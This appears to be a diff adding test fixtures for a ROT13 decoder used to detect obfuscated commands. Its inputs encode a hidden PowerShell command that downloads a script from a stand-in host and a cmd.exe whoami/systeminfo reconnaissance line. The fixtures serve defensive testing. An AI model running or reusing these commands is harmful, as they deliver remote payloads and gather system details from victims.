@@ -1,0 +1,4 @@
+# rot13-decode · Golden Fixtures · RC3.2a
+# Classic Caesar-13. Alphabetic-only shift; digits / punctuation untouched.
+{"case_id":"rot13-ps-downloader","description":"ROT13 → PowerShell IEX downloader","input":"cbjrefuryy.rkr -abc -j uvqqra -p \"vje uggcf://n.o/k.cf1\"","detect_min_confidence":0.5,"expected_output_contains":["powershell.exe","-nop","-w hidden","https://a.b/x.ps1"]}
+{"case_id":"rot13-cmd-recon","description":"ROT13 → cmd.exe /c recon","input":"pzq.rkr /p jubnzv && flfvasb","detect_min_confidence":0.4,"expected_output_contains":["cmd.exe","whoami"]}
